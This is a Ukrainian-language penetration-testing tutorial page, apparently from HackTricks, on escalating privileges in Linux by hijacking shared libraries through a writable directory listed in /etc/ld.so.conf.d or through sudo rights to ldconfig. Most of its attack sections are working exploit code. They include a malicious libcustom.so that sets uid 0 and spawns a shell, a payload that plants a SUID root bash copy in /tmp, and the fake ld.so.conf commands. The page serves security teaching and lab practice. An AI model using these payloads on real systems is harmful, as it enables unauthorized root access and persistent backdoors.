# Приклад privesc exploit через ld.so

{{#include ../../banners/hacktricks-training.md}}

## Підготовка середовища

У наступному розділі наведено код файлів, які ми будемо використовувати для підготовки середовища.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Створіть** ці файли на своїй машині в одній папці
2. **Скомпілюйте** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Скопіюйте** `libcustom.so` до `/usr/lib` і оновіть кеш: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Скомпілюйте** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Перевірте середовище

Переконайтеся, що _libcustom.so_ **завантажується** з _/usr/lib_ і що ви можете **виконати** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Корисні команди triage

Під час атаки на реальну ціль перевіряйте **точну назву бібліотеки**, яка потрібна бінарному файлу, і те, що **loader наразі вирішує**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Кілька корисних нюансів:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, оскільки
перенаправлення виконується поточною shell. Натомість використовуйте
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Бінарні файли **SUID/privileged** ігнорують `LD_LIBRARY_PATH`/`LD_PRELOAD` у
**secure-execution mode**, але директорії з `/etc/ld.so.conf` все одно є частиною
довіреної конфігурації loader, тому ця помилкова конфігурація все ще може
впливати на privileged програми.
- У новіших версіях glibc dynamic loader також підтримує
`--list-diagnostics`, що зручно для налагодження розв'язання cache та вибору
піддиректорій `glibc-hwcaps`, коли hijack поводиться неочікувано.

## Exploit

У цьому сценарії припустімо, що **хтось створив вразливий запис** у файлі в _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Вразлива папка — _/home/ubuntu/lib_ (де ми маємо доступ на запис).\
**Завантажте та скомпілюйте** наведений нижче код у цьому шляху:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Якщо ви очікуєте, що згодом **root** (або інший привілейований обліковий запис) виконає вразливий бінарний файл, зазвичай краще залишити **артефакт, власником якого є root**, замість запуску інтерактивної оболонки. Наприклад:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Після виконання з привілейованими правами можна використати `/tmp/rootbash -p`.

Тепер, коли ми **створили шкідливу бібліотеку libcustom у неправильно налаштованому** шляху, потрібно дочекатися **reboot** або виконання root-користувачем **`ldconfig`** (_якщо ви можете виконати цей binary через **sudo** або він має **suid bit**, ви зможете виконати його самостійно_).

Після цього **повторно перевірте**, звідки executable `sharedvuln` завантажує бібліотеку `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Як бачите, його **завантажено з `/home/ubuntu/lib`**, і якщо будь-який користувач його виконає, буде запущено shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Зверніть увагу, що в цьому прикладі ми не підвищували привілеї, але, змінивши виконувані команди та **дочекавшись, поки root або інший привілейований користувач виконає вразливий binary**, ми зможемо підвищити привілеї.

### Інші misconfigurations - Та сама vuln

У попередньому прикладі ми змоделювали misconfiguration, за якої адміністратор **вказав непривілейовану папку всередині configuration file у `/etc/ld.so.conf.d/`**.\
Але існують й інші misconfigurations, які можуть спричинити ту саму vulnerability: якщо ви маєте **write permissions** до будь-якого **config file** у `/etc/ld.so.conf.d`, до папки `/etc/ld.so.conf.d` або до файлу `/etc/ld.so.conf`, ви можете налаштувати ту саму vulnerability та exploit її.

## Exploit 2

**Припустімо, що ви маєте sudo privileges для `ldconfig`**.\
Ви можете вказати `ldconfig`, **звідки завантажувати conf files**, тож ми можемо скористатися цим, щоб змусити `ldconfig` завантажувати довільні папки.\
Отже, створімо необхідні files і folders для завантаження "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Тепер, як зазначено в **попередньому exploit**, **створіть malicious library у `/tmp`**.\
І нарешті, завантажмо шлях і перевіримо, звідки binary завантажує library:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Як ви можете бачити, маючи привілеї sudo для `ldconfig`, ви можете використати цю саму вразливість.**



## Посилання

- [ld.so(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
